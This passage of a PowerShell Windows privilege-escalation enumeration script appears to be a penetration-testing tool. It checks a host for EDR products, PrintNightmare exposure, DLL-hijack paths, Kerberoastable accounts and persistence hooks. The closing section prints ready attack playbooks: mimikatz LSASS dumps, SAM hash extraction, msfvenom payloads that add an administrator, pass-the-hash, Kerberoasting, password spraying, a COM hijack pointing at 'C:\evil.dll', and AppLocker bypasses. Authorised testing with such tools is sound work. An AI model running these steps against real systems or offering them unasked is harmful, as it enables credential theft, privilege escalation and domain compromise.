  Info "Print Spooler service is running"
  $pnp = RegGet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint' 'NoWarningNoElevationOnInstall'
  if($pnp -eq 1){ Finding "PrintNightmare surface: Spooler running + PointAndPrint NoWarningNoElevationOnInstall=1 (CVE-2021-34527)"; Flag PRINTNIGHTMARE 'spooler + PointAndPrint' }
  else { Info "Spooler running -> still test CVE-2021-1675 / 34527 if the host is unpatched (build/patch dependent)" }
}
# Sysmon (are your actions being recorded?).
if(Get-Service -Name Sysmon*,Sysmon64 -ErrorAction SilentlyContinue){ Info "Sysmon service present (activity is being logged)" }

# ============================================================ AV / EDR
Sec "AV / EDR detection"
Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct 2>$null | ForEach-Object { Info ("AV product: " + $_.displayName) }
$edr = 'CarbonBlack|cb.exe|cylance|CrowdStrike|csagent|SentinelOne|sentinel|cortex|traps|Sophos|MsMpEng|windefend|elastic|winlogbeat|xagt|FireEye|Tanium|Qualys|CylanceSvc|CSFalcon|WdFilter'
Get-Process 2>$null | Where-Object { $_.Name -match $edr } | Select-Object -Unique Name | ForEach-Object { Finding ("EDR/AV process: " + $_.Name) }
Get-Service 2>$null | Where-Object { $_.Name -match $edr -or $_.DisplayName -match $edr } | Select-Object -Unique Name | ForEach-Object { Info ("EDR/AV service: " + $_.Name) }

# ============================================================ named pipes / IFEO
Sec "Named pipes & image-hijack autoruns"
Info "Named pipes (pipe abuse / impersonation surface):"
try{
  [System.IO.Directory]::GetFiles("\\.\pipe\") | ForEach-Object { $_ -replace '\\\\\.\\pipe\\','' } |
    Sort-Object -Unique | Select-Object -First 40 | ForEach-Object { Info ("   " + $_) }
}catch{ Info "   (could not enumerate named pipes)" }
# Image File Execution Options debuggers + Winlogon userinit/shell hijacks.
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' 2>$null | ForEach-Object {
  $d = RegGet $_.PSPath 'Debugger'; if($d){ Finding ("IFEO debugger set on " + $_.PSChildName + " -> " + $d) }
}
$ui = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'Userinit'
$sh = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'Shell'
Info ("Winlogon Userinit=" + $ui + "  Shell=" + $sh + " (non-default values are suspicious / hijackable)")

# ============================================================ DLL hijack / PATH
Sec "DLL hijacking & writable-directory / PATH abuse"
Info ("PATH: " + $env:PATH)
# System PATH (hijacks DLLs/commands for SYSTEM services) vs user PATH.
$sysPath = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name Path -ErrorAction SilentlyContinue).Path
($env:PATH -split ';') | Where-Object { $_ } | Select-Object -Unique | ForEach-Object {
  $dir = $_
  if((Test-Path $dir) -and (TestWritable $dir)){
    $inSys = ($sysPath -and (($sysPath -split ';') -contains $dir))
    $scope = if($inSys){ "SYSTEM PATH (hijacks DLLs/commands loaded by SYSTEM services)" } else { "user PATH" }
    Finding ("Writable directory in " + $scope + ": " + $dir + " -> plant a DLL any process loads by unqualified name (PATH is searched), or a name-shadowing .exe for a command a privileged job runs")
    Flag DLL_HIJACK ("PATHdir: " + $dir + " || " + $scope)
  }
}
# Writable Program Files app dirs: name the exe(s) so the hijack is concrete.
foreach($pf in @("$env:ProgramFiles","${env:ProgramFiles(x86)}")){
  if(-not $pf){ continue }
  Get-ChildItem $pf -Directory -ErrorAction SilentlyContinue | Select-Object -First 40 | ForEach-Object {
    $appdir = $_.FullName
    if(TestWritable $appdir){
      $exes = @(Get-ChildItem $appdir -Filter *.exe -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name)
      $exeList = if($exes.Count){ ($exes -join ', ') } else { '(no top-level exe; check subfolders)' }
      Finding ("Writable app dir (DLL hijack): " + $appdir + " -> exe(s): " + $exeList +
               ". The app dir is searched FIRST, so drop a DLL one of these loads by name; confirm the exact DLL with ProcMon (Result=NAME NOT FOUND, Path ends .dll).")
      Flag DLL_HIJACK ("AppDir: " + $appdir + " || exes: " + $exeList)
    }
  }
}
# Services whose binary sits in a writable dir -> DLL-hijack that service directly.
foreach($sv in (Get-CimInstance Win32_Service)){
  $b = Get-ServiceBinary $sv.PathName
  if($b -and (Test-Path $b)){
    $bd = Split-Path $b -Parent
    if($bd -and ($bd -notmatch '^[A-Za-z]:\\Windows') -and (TestWritable $bd)){
      Finding ("Service binary directory is writable (DLL hijack): service '" + $sv.Name + "' at " + $bd +
               " -> plant a DLL '" + (Split-Path $b -Leaf) + "' loads, then restart the service (runs as " + $sv.StartName + ")")
      Flag DLL_HIJACK ("SvcDir: " + $bd + " || svc: " + $sv.Name + " (" + $sv.StartName + ")")
    }
  }
}

# ============================================================ software / network
Sec "Installed software (versions -> match to CVEs offline)"
$uk = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*')
Get-ItemProperty $uk 2>$null | Where-Object { $_.DisplayName } |
  Select-Object DisplayName, DisplayVersion -Unique | Sort-Object DisplayName |
  ForEach-Object { Info ($_.DisplayName + "  " + $_.DisplayVersion) }

Sec "Network"
Info "IP config:"; (ipconfig /all) 2>$null | Select-String 'IPv4|Description|Default Gateway|DNS Servers|Physical' | ForEach-Object { Info $_.ToString().Trim() }
Info "Listening / connections:"; (netstat -ano) 2>$null | Select-String 'LISTENING|ESTABLISHED' | Select-Object -First 40 | ForEach-Object { Info $_.ToString().Trim() }
# Machine-parseable listener inventory the sheet backfills: proto/addr/port +
# owning process + the Windows SERVICE hosting it (svchost-backed ports resolve
# to the real service) + the BACKING BINARY. READ-ONLY (Get-* queries only).
Info "listening-service inventory (proto/port/process/service/binary):"
$svcByPid = @{}
try {
  Get-CimInstance Win32_Service -ErrorAction Stop | Where-Object { $_.ProcessId -gt 0 } | ForEach-Object {
    if(-not $svcByPid.ContainsKey([int]$_.ProcessId)){ $svcByPid[[int]$_.ProcessId] = $_ }
  }
} catch {}
function Emit-Listener($proto,$addr,$port,$op){
  $proc=""; $bin=""; $svc=""
  if($op){
    $p = Get-Process -Id $op -ErrorAction SilentlyContinue
    if($p){ $proc = $p.ProcessName; $bin = $p.Path }
    if($svcByPid.ContainsKey([int]$op)){ $s = $svcByPid[[int]$op]; $svc = $s.Name; if(-not $bin){ $bin = $s.PathName } }
  }
  Emit ("    LISTEN proto=$proto addr=$addr port=$port pid=$op proc=$proc svc=$svc bin=$bin")
}
if(Get-Command Get-NetTCPConnection -ErrorAction SilentlyContinue){
  Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue | ForEach-Object {
    Emit-Listener 'tcp' $_.LocalAddress $_.LocalPort $_.OwningProcess }
  if(Get-Command Get-NetUDPEndpoint -ErrorAction SilentlyContinue){
    Get-NetUDPEndpoint -ErrorAction SilentlyContinue | ForEach-Object {
      Emit-Listener 'udp' $_.LocalAddress $_.LocalPort $_.OwningProcess }
  }
} else {
  # Legacy fallback (no Get-NetTCPConnection): parse netstat -ano.
  (netstat -ano) 2>$null | Select-String 'LISTENING| UDP ' | ForEach-Object {
    $f = ($_.ToString() -replace '\s+',' ').Trim().Split(' ')
    if($f.Count -ge 4){
      $proto = $f[0].ToLower(); $lap = $f[1]; $op = $f[-1]
      $port = ($lap -split ':')[-1]; $addr = $lap.Substring(0, $lap.LastIndexOf(':'))
      if($port -match '^\d+$'){ Emit-Listener $proto $addr $port $op }
    }
  }
}
Info "Routes:"; (route print) 2>$null | Select-Object -First 20 | ForEach-Object { Info $_ }
Info "Shares:"; Get-SmbShare 2>$null | ForEach-Object { Info ($_.Name + "  " + $_.Path) }
Info ("Firewall profiles: "); (Get-NetFirewallProfile 2>$null) | ForEach-Object { Info ("   " + $_.Name + " enabled=" + $_.Enabled) }
# RDP exposure + NLA (NLA off widens the attack surface / allows some CVEs).
$rdpDeny = RegGet 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' 'fDenyTSConnections'
$nla     = RegGet 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' 'UserAuthentication'
Info ("RDP enabled=" + ($rdpDeny -eq 0) + "  NLA required=" + ($nla -eq 1))
if($rdpDeny -eq 0 -and $nla -ne 1){ Finding "RDP enabled with NLA OFF -> broader pre-auth surface" }

# ============================================================ processes / misc
Sec "Processes running as SYSTEM / other users"
Get-CimInstance Win32_Process | ForEach-Object {
  $o = Invoke-CimMethod -InputObject $_ -MethodName GetOwner -ErrorAction SilentlyContinue
  if($o.User){ "{0,-28} pid={1,-6} {2}\{3}" -f $_.Name,$_.ProcessId,$o.Domain,$o.User }
} | Sort-Object -Unique | Select-Object -First 60 | ForEach-Object { Info $_ }

Sec "Environment variables"
Get-ChildItem Env: | ForEach-Object { Info ($_.Name + "=" + $_.Value) }

# ============================================================ lateral movement
Sec "Lateral movement & pivoting"
Info "Mapped drives / cached sessions (net use):"
(net use) 2>$null | ForEach-Object { Info $_ }
$winrm = Get-Service WinRM -ErrorAction SilentlyContinue
if($winrm -and $winrm.Status -eq 'Running'){ Info "WinRM running (PSRemoting reachable in/out)"; Flag WINRM_LATERAL 1 }
$th = (Get-Item WSMan:\localhost\Client\TrustedHosts -ErrorAction SilentlyContinue).Value
if($th){ Info ("WinRM TrustedHosts: " + $th + "  (outbound PSRemoting targets)") }
Info "ARP cache (reachable hosts):"
(arp -a) 2>$null | Select-String 'dynamic' | Select-Object -First 20 | ForEach-Object { Info $_.ToString().Trim() }
# AD-joined: read-only LDAP queries for the classic lateral/roasting targets.
$cs2 = Get-CimInstance Win32_ComputerSystem
if($cs2.PartOfDomain){
  Info ("Domain: " + $cs2.Domain)
  try{
    $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
    $ds = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$root")
    $ds.PageSize = 200
    $ds.ClientTimeout = [TimeSpan]::FromSeconds(15)
    # Kerberoastable: user accounts carrying an SPN.
    $ds.Filter = "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))"
    $spn = @($ds.FindAll() | ForEach-Object { $_.Properties['samaccountname'] -join '' })
    if($spn.Count){ Finding ("Kerberoastable accounts (SPN set): " + ($spn -join ', ')); Flag KERBEROAST ($spn -join ',') }
    # AS-REP roastable: DONT_REQ_PREAUTH (0x400000).
    $ds.Filter = "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
    $asrep = @($ds.FindAll() | ForEach-Object { $_.Properties['samaccountname'] -join '' })
    if($asrep.Count){ Finding ("AS-REP roastable accounts (no Kerberos pre-auth): " + ($asrep -join ', ')); Flag ASREP ($asrep -join ',') }
    # Unconstrained delegation (TRUSTED_FOR_DELEGATION 0x80000) - coerce + capture a TGT.
    $ds.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
    $unc = @($ds.FindAll() | ForEach-Object { $_.Properties['name'] -join '' })
    if($unc.Count){ Finding ("Unconstrained-delegation hosts: " + ($unc -join ', ') + " -> coerce auth + capture a TGT"); Flag DELEGATION ($unc -join ',') }
  }catch{ Info "  (AD queries unavailable / no reachable DC in this context)" }
}
if(Get-Command sqlcmd -ErrorAction SilentlyContinue){ Info "sqlcmd present -> enumerate MSSQL linked servers (EXEC sp_linkedservers) for onward code exec" }

# ============================================================ restricted environment
Sec "Restricted environment & escape surface"
Info ("Language mode: " + $ExecutionContext.SessionState.LanguageMode)
if($ExecutionContext.SessionState.LanguageMode -eq 'ConstrainedLanguage'){
  Finding "PowerShell ConstrainedLanguage mode -> WDAC/AppLocker enforced; pivot via signed LOLBAS or a full-language runspace (documented bypasses)"; Flag CLM 1
}
Get-PSSessionConfiguration -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '^microsoft' } | ForEach-Object {
  Info ("PSSession endpoint (possible JEA): " + $_.Name + "  RunAs=" + $_.RunAsUser)
}
try{ if(Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue){ Info "AppLocker effective policy present -> LOLBAS in allowed dirs may still run" } }catch{}

# ============================================================ persistence footholds
Sec "Persistence footholds (writable auto-exec hooks)"
# Read-only DETECTION of auto-run hooks (both a persistence surface and, if a
# privileged principal triggers one, an escalation path). Nothing is written.
foreach($pf in @($PROFILE.AllUsersAllHosts, $PROFILE.CurrentUserAllHosts)){
  if($pf){
    if((Test-Path $pf) -and (TestWritable $pf)){ Finding ("Writable PowerShell profile: " + $pf); Flag PS_PROFILE $pf }
    elseif((-not (Test-Path $pf)) -and (TestWritable (Split-Path $pf))){ Info ("PS profile dir writable (can be created): " + (Split-Path $pf)) }
  }
}
Info "COM hijack surface (writable HKCU CLSID InprocServer32), sampled:"
Get-ChildItem 'HKCU:\SOFTWARE\Classes\CLSID' -ErrorAction SilentlyContinue | Select-Object -First 200 | ForEach-Object {
  $ips = Join-Path $_.PSPath 'InprocServer32'
  if((Test-Path $ips) -and (TestWritable $ips)){
    Finding ("Writable HKCU COM InprocServer32 (hijack): CLSID " + $_.PSChildName +
             " -> reg add 'HKCU\SOFTWARE\Classes\CLSID\" + $_.PSChildName + "\InprocServer32' /ve /d C:\evil.dll /f" +
             " (loads when a privileged app instantiates this CLSID)")
    Flag COM_HIJACK ($_.PSChildName + " || InprocServer32 -> C:\evil.dll")
  }
}
$wf = @(Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue)
$wc = @(Get-WmiObject -Namespace root\subscription -Class __EventConsumer -ErrorAction SilentlyContinue)
if($wf.Count -or $wc.Count){ Finding ("WMI event subscriptions present (" + $wf.Count + " filters, " + $wc.Count + " consumers) -> review for stealth persistence"); Flag WMI_PERSIST ($wf.Count.ToString() + "f/" + $wc.Count + "c") }
$appinit = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' 'AppInit_DLLs'
if($appinit){ $aiOn = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' 'LoadAppInit_DLLs'; Info ("AppInit_DLLs=" + $appinit + " (LoadAppInit_DLLs=" + $aiOn + ")") }
foreach($ac in @('sethc.exe','utilman.exe','osk.exe','Magnify.exe')){
  $dbg = RegGet ("HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + $ac) 'Debugger'
  if($dbg){ Finding ("Accessibility hijack set on " + $ac + " -> " + $dbg + " (pre-logon SYSTEM shell at the lock screen)"); Flag ACCESSIBILITY ($ac + " -> " + $dbg) }
}
try{ (Get-Item 'HKLM:\SOFTWARE\Microsoft\Netsh' -ErrorAction SilentlyContinue).Property | ForEach-Object {
  Info ("netsh helper DLL: " + $_ + " = " + (RegGet 'HKLM:\SOFTWARE\Microsoft\Netsh' $_)) } }catch{}

# ============================================================ how to exploit
# Tailored to the [!] findings above: only the vectors that ACTUALLY fired on
# this host are printed, with the specific privilege / service / file substituted
# in, plus prereq -> command -> confirm -> cleanup. Read-only guidance that
# points at EXISTING public tools; nothing is generated or run for you.
Sec "How to exploit (tailored to THIS host's findings)"
function Step($title, $lines){ Emit ""; Emit ("  >> " + $title); foreach($l in $lines){ Emit ("     " + $l) } }
function StepList($tag){ foreach($v in (PbVals $tag)){ Emit ("       - " + $v) } }

if(@($script:PB).Count -eq 0){
  Emit "  No known escalation vectors auto-matched. Still review every [!] line, and"
  Emit "  feed the OS build + hotfix list to WES-NG / Watson offline for missing-patch LPEs."
}

if(PbHas POTATO){ Step "SeImpersonate / SeAssignPrimaryToken -> SYSTEM (Potato family)" @(
  'prereq : the privilege is Enabled (shown above); works on patched Win10/11 & Server 2016-2022.',
  'run    : GodPotato -cmd "cmd /c whoami"        (DCOM/RPC - most reliable today)',
  '         PrintSpoolerPotato / PrintSpoofer64.exe -i -c cmd     (spooler named pipe)',
  '         SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a whoami   (MS-EFSR)',
  '         JuicyPotatoNG / SigmaPotato as fallbacks',
  'confirm: whoami  ->  nt authority\system') }

if(PbHas SEBACKUP){ Step "SeBackupPrivilege -> read any file -> hash dump" @(
  'run    : reg save hklm\sam sam & reg save hklm\system system',
  '         impacket-secretsdump -sam sam -system system LOCAL',
  '         on a DC: diskshadow/VSS to copy NTDS.dit, then secretsdump -ntds',
  'confirm: local/domain NT hashes recovered -> crack or pass-the-hash') }

if(PbHas SERESTORE){ Step "SeRestore / SeTakeOwnership -> own a SYSTEM binary" ((PbVals SERESTORE) + @(
  'run    : takeown /f <system-file> && icacls <file> /grant %USERNAME%:F',
  '         replace a SYSTEM service/auto-run binary you now control, then restart it.',
  'confirm: the hijacked service runs your payload as SYSTEM')) }

if(PbHas SEMANAGEVOL){ Step "SeManageVolumePrivilege -> arbitrary write -> SYSTEM" @(
  'run    : use the public SeManageVolumeExploit (grants write to C:\Windows), then drop a',
  '         hijackable DLL (e.g. a Print/WptsExtensions DLL) into System32 and trigger it.',
  'confirm: your DLL loads in a SYSTEM process  ->  whoami  ->  nt authority\system') }

if(PbHas SELOADDRIVER){ Step "SeLoadDriverPrivilege -> BYOVD -> kernel/SYSTEM" @(
  'run    : load a known-vulnerable signed driver (e.g. Capcom.sys) via NtLoadDriver / EoPLoadDriver,',
  '         then use its ioctl to run code in kernel context.',
  'confirm: SYSTEM shell (test in a lab/VM - driver loads can bugcheck)') }

if(PbHas SEDEBUG){ Step "SeDebugPrivilege -> dump LSASS / inject SYSTEM" @(
  'run    : procdump -accepteula -ma lsass.exe lsass.dmp',
  '         mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"',
  'confirm: cleartext / NT hashes for logged-on privileged users') }

if(PbHas SECREATETOKEN -or PbHas SETCB){ Step "SeCreateToken / SeTcb -> forge a SYSTEM token" @(
  'run    : use a public token-forging PoC that calls ZwCreateToken with the SYSTEM SID + all groups,',
  '         then CreateProcessAsUser with the forged token.',
  'confirm: whoami  ->  nt authority\system') }

if(PbHas ADMIN_TOKEN){ Step "In Administrators but Medium integrity -> UAC bypass" @(
  'prereq : your token is in Administrators (shown above) but not yet elevated.',
  'run    : a fileless UAC bypass (fodhelper / computerdefaults / silentcleanup) to spawn a High-IL process.',
  'confirm: the new process runs at High integrity (whoami /groups -> High Mandatory Level)') }

if(PbHas UNQUOTED){ Step "Unquoted service path -> plant the intercept exe (EXACT path per line)" ((PbVals UNQUOTED) + @(
  'build  : msfvenom -p windows/x64/exec CMD="net localgroup administrators <you> /add" -f exe-service -o payload.exe',
  'run    : copy payload.exe to the exact "plant:" path shown above; then: sc stop <svc> & sc start <svc>',
  'confirm: the payload runs as the listed "runs-as" account (usually SYSTEM)')) }

if(PbHas SVC_BIN -or PbHas SVC_REG){ Step "Writable service binary / registry key -> SYSTEM (exact target per line)" (
  (PbVals SVC_BIN) + (PbVals SVC_REG) + @(
  'binary : copy /Y payload.exe over the "overwrite:" path shown; sc stop <svc> & sc start <svc>.',
  'registry: run the exact "reg add ... ImagePath ..." line shown, then sc start <svc>.',
  'confirm: whoami in the payload  ->  nt authority\system')) }

if(PbHas TASK_BIN){ Step "Writable scheduled-task binary -> run as the task principal" ((PbVals TASK_BIN) + @(
  'run    : replace the referenced binary with your payload; wait for the trigger (or schtasks /run).',
  'confirm: payload runs as the task run-as account')) }

if(PbHas AIE){ Step "AlwaysInstallElevated -> MSI as SYSTEM" @(
  'build  : msfvenom -p windows/x64/exec CMD="cmd /c net user ..." -f msi -o evil.msi   (on your box)',
  'run    : msiexec /quiet /qn /i C:\path\evil.msi',
  'confirm: the MSI custom action runs as SYSTEM') }

if(PbHas AUTORUN){ Step "Writable autorun binary -> code exec at next logon" ((PbVals AUTORUN) + @(
  'run    : replace the referenced binary with your payload; fires at the next interactive logon.',
  'confirm: payload runs in the logging-on user context (privileged if an admin logs in)')) }

if(PbHas PRINTNIGHTMARE){ Step "PrintNightmare (CVE-2021-34527/1675) -> SYSTEM" @(
  'prereq : Spooler running (confirmed) + host unpatched.',
  'run    : a public PrintNightmare LPE PoC (CVE-2021-1675 local variant) loads your DLL via the spooler.',
  'confirm: whoami  ->  nt authority\system') }

if(PbHas HIVE){ Step "HiveNightmare / SeriousSAM (CVE-2021-36934) -> SAM hashes" ((PbVals HIVE) + @(
  'run    : hashes live in a VSS shadow copy readable by users:',
  '         reg save + read \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM (and SYSTEM)',
  '         impacket-secretsdump -sam SAM -system SYSTEM LOCAL',
  'confirm: local account NT hashes -> crack or pass-the-hash')) }

if(PbHas SAM_BACKUP){ Step "SAM/SYSTEM hive backup -> offline hashes" ((PbVals SAM_BACKUP) + @(
  'run    : impacket-secretsdump -sam <SAM> -system <SYSTEM> LOCAL',
  'confirm: local NT hashes -> crack (hashcat -m 1000) or pass-the-hash')) }

if(PbHas GPP){ Step "GPP cpassword -> plaintext domain creds" ((PbVals GPP) + @(
  'run    : gpp-decrypt <cpassword>      (the AES key is public)',
  'use    : the recovered domain creds with runas /netonly, psexec.py, or netexec',
  'confirm: authenticated as the GPP-managed account')) }

if(PbHas AUTOLOGON){ Step "Registry autologon -> plaintext creds" ((PbVals AUTOLOGON) + @(
  'use    : the DefaultUserName / DefaultPassword directly (runas, RDP, or SMB).',
  'confirm: authenticated as that account')) }

if(PbHas WDIGEST){ Step "WDigest UseLogonCredential=1 -> cleartext creds in LSASS" @(
  'prereq : wait for / trigger a privileged interactive logon.',
  'run    : dump LSASS (procdump + mimikatz sekurlsa::logonpasswords) -> cleartext passwords',
  'confirm: cleartext password for a privileged user') }

if(PbHas WSUS){ Step "WSUS over HTTP -> update injection to SYSTEM" ((PbVals WSUS) + @(
  'run    : MITM the WSUS traffic (WSUSpect / PyWSUS) and inject a signed built-in binary as an "update".',
  'confirm: the injected command runs as SYSTEM')) }

if(PbHas LATFP){ Step "LocalAccountTokenFilterPolicy=1 -> remote local-admin (PtH)" @(
  'run    : the local admin hash works remotely:',
  '         netexec smb <ip> -u administrator -H <nthash> -x whoami',
  '         (or impacket-psexec administrator@<ip> -hashes :<nthash>)',
  'confirm: SYSTEM command output from the remote host') }

if(PbHas DLL_HIJACK){ Step "DLL hijack -> code exec in a privileged process (targets above)" ((PbVals DLL_HIJACK) + @(
  'find   : ProcMon -> filter Result=NAME NOT FOUND and Path ends .dll for the target exe/service;',
  '         that missing DLL name (searched in the writable dir above) is your exact target.',
  'build  : msfvenom -p windows/x64/exec CMD="..." -f dll -o <MissingDll>.dll   (or a proxy/export-forwarding DLL',
  '         so the app keeps working). Place it in the writable dir shown; start/restart the exe or service.',
  'confirm: whoami inside the loaded DLL  ->  the app''s (often SYSTEM) context')) }

if(PbHas STORED_CREDS -or PbHas BROWSER_CREDS -or PbHas APP_CREDS -or PbHas CLOUD -or PbHas UNATTEND){
  Step "Harvested credentials -> reuse & pivot" (
  (PbVals STORED_CREDS) + (PbVals BROWSER_CREDS) + (PbVals APP_CREDS) + (PbVals CLOUD) + (PbVals UNATTEND) + @(
  'cmdkey : runas /savecred /user:<target> cmd   (use a saved credential without knowing it)',
  'browser: decrypt on-host (the DPAPI key is the logged-on user); SharpChrome / firefox_decrypt',
  'app    : SessionGopher / native decryptors for PuTTY/WinSCP/VNC/FileZilla',
  'kdbx   : keepass2john <db>.kdbx > h; john h    (offline)',
  'cloud  : aws sts get-caller-identity  /  az account show  /  kubectl auth can-i --list',
  'reuse  : spray any recovered password across the domain - reuse is common.',
  'confirm: authenticated access to a new account/host')) }

if(PbHas WESNG){ Step "Missing-patch LPE (build-based)" ((PbVals WESNG) + @(
  'run    : (offline)  wes.py systeminfo.txt   or  Watson  -> ranked missing-KB LPE candidates',
  '         match a candidate to a public PoC (e.g. an afd.sys / clfs.sys / win32k LPE), compile, run.',
  'confirm: whoami  ->  nt authority\system   (test in a snapshot - kernel LPEs can bugcheck)')) }

if(PbHas KERBEROAST){ Step "Kerberoast SPN accounts -> offline crack" ((PbVals KERBEROAST) + @(
  'run    : Rubeus.exe kerberoast /nowrap        (or: impacket-GetUserSPNs <dom>/<user>:<pw> -request)',
  'crack  : hashcat -m 13100 hashes.txt rockyou.txt      (service accounts often have weak passwords)',
  'confirm: a cracked service-account password -> reuse / onward access')) }

if(PbHas ASREP){ Step "AS-REP roast (no pre-auth) -> offline crack" ((PbVals ASREP) + @(
  'run    : impacket-GetNPUsers <dom>/ -usersfile users.txt -no-pass   (or Rubeus asreproast)',
  'crack  : hashcat -m 18200 asrep.txt rockyou.txt',
  'confirm: a cracked account password')) }

if(PbHas DELEGATION){ Step "Unconstrained delegation -> capture a privileged TGT" ((PbVals DELEGATION) + @(
  'prereq : admin on the delegation host (this finding lists the hosts).',
  'run    : Rubeus.exe monitor /interval:5   then coerce a DC (PetitPotam / printerbug) to auth to it;',
  '         extract the DC TGT and pass-the-ticket.',
  'confirm: DCSync / domain admin with the captured ticket')) }

if(PbHas CLM){ Step "ConstrainedLanguage mode -> regain full language" @(
  'run    : use signed LOLBAS (InstallUtil / MSBuild / regsvr32) to run code outside CLM, or a',
  '         PowerShell v2 downgrade / custom runspace (documented AppLocker/WDAC bypasses).',
  'confirm: $ExecutionContext.SessionState.LanguageMode -> FullLanguage') }

if(PbHas PS_PROFILE -or PbHas COM_HIJACK){ Step "Writable PS profile / COM CLSID -> code exec on trigger" (
  (PbVals PS_PROFILE | ForEach-Object { "profile: " + $_ }) + (PbVals COM_HIJACK | ForEach-Object { "clsid: " + $_ }) + @(
  'profile: your commands run whenever that user starts PowerShell (privileged if an admin does).',
  'com    : point the writable InprocServer32 at your DLL; loads when a privileged app instantiates the CLSID.',
  'confirm: code exec in the triggering principal''s context')) }

if(PbHas ACCESSIBILITY -or PbHas WMI_PERSIST){ Step "Existing persistence found - review / reuse" (
  (PbVals ACCESSIBILITY) + (PbVals WMI_PERSIST | ForEach-Object { "wmi: " + $_ }) + @(
  'accessibility: a sethc/utilman debugger gives a SYSTEM shell from the lock screen (Shift x5 / Win+U).',
  'wmi    : inspect the __EventFilter/__EventConsumer pair (Get-WmiObject root\subscription) - it may be',
  '         an implant or your own foothold; note it for the report either way.',
  'confirm: understand what auto-runs and as whom')) }

if(PbHas WINRM_LATERAL){ Step "WinRM reachable -> lateral with recovered creds" @(
  'run    : netexec winrm <ip> -u <user> -p <pass>  (or -H <nthash>) -x whoami',
  '         Enter-PSSession -ComputerName <ip> -Credential <user>   (interactive)',
  'confirm: command output from the remote host as that user') }

Emit ""
Emit "  Every step above references an EXISTING public tool or technique - run it"
Emit "  yourself, only within your rules of engagement. Match each block to its [!]"
Emit "  line. Nothing here was executed for you."

Emit ""
Emit "Done. Review every [!] line. Nothing was changed on this host."
if($OutFile){ Emit ("Full report written to: " + $OutFile) }
